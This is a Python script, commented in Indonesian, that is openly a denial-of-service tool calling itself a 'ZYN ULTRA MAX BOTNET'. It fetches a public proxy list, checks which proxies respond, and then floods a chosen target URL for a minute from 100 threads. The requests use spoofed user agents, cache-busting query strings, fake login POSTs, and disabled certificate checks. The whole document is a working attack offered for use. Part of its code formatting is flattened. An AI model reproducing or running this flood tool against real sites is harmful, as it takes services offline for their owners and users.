import threading import urllib.request import urllib.parse import ssl import time import random import socket

alive_proxies = [] lock = threading.Lock() sent = 0 fail = 0 run = True

user_agents = [ "Mozilla/5.0 (Windows NT 10.0; Win64; x64)", "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7)", "Mozilla/5.0 (X11; Linux x86_64)", "Googlebot/2.1 (+http://www.google.com/bot.html)", "curl/7.68.0", "Wget/1.20.3" ]

paths = ["/", "/login", "/admin", "/api", "/panel", "/js", "/img", "/css", "/contact"]

Mendapatkan proxy HTTP

def get_proxies_from_api(): print("🔄 Mengambil proxy dari API...") url = 'https://raw.githubusercontent.com/TheSpeedX/PROXY-List/master/http.txt' with urllib.request.urlopen(url, timeout=10) as response: raw = response.read().decode() proxies = list(set([line.strip() for line in raw.split('\n') if line.strip()])) print(f"✅ Total proxy didapat: {len(proxies)}") return proxies

Memvalidasi proxy hidup

def check_proxy(proxy): try: host, port = proxy.split(":") sock = socket.create_connection((host, int(port)), timeout=3) sock.close() with lock: alive_proxies.append(proxy) except: pass

def validate_proxies(proxy_list): print("🔍 Mengecek proxy aktif...") threads = [] for p in proxy_list: t = threading.Thread(target=check_proxy, args=(p,)) t.daemon = True t.start() threads.append(t) time.sleep(0.01) for t in threads: t.join() print(f"✅ Proxy aktif: {len(alive_proxies)}")

def rand_str(n): return ''.join(random.choices("abcdefghijklmnopqrstuvwxyz0123456789", k=n))

def attack(proxy, target): global sent, fail while run: try: method = random.choice(["GET"] * 3 + ["POST"]) path = random.choice(paths) + f"?q={rand_str(6)}" url = target + path headers = { "User-Agent": random.choice(user_agents), "Referer": "https://www.google.com/", "Connection": "keep-alive", "Cache-Control": "no-cache", "Accept": "/", "Accept-Language": "en-US,en;q=0.9", "ZYN-FORCE": "ULTRA-DEWA" }

if method == "POST":
            data = urllib.parse.urlencode({
                "user": rand_str(8),
                "pass": rand_str(12)
            }).encode()
            headers["Content-Type"] = "application/x-www-form-urlencoded"
        else:
            data = None

        proxy_handler = urllib.request.ProxyHandler({'https': f'http://{proxy}'})
        opener = urllib.request.build_opener(proxy_handler)
        req = urllib.request.Request(url, data=data, headers=headers, method=method)
        ctx = ssl._create_unverified_context()
        res = opener.open(req, timeout=5, context=ctx)

        with lock:
            if res.status in [200, 301, 302, 404]:
                sent += 1
            else:
                fail += 1
    except:
        with lock:
            fail += 1

def start_attack(target_url): global run proxies = get_proxies_from_api() validate_proxies(proxies) if len(alive_proxies) == 0: print("❌ Tidak ada proxy aktif") return

print("\n🔥 ZYN ULTRA MAX BOTNET ATTACK STARTED 🔥")
print(f"🎯 Target : {target_url}")
print(f"🧠 Threads: 100")
print(f"🌐 Proxy aktif: {len(alive_proxies)}\n")

threads = []
start_time = time.time()
for i in range(100):
    proxy = random.choice(alive_proxies)
    t = threading.Thread(target=attack, args=(proxy, target_url))
    t.daemon = True
    t.start()
    threads.append(t)

try:
    while time.time() - start_time < 60:
        time.sleep(1)
        with lock:
            print(f"[ZYN⚡] Sent: {sent} | Failed: {fail} | Time: {int(time.time() - start_time)}s")
finally:
    run = False

  
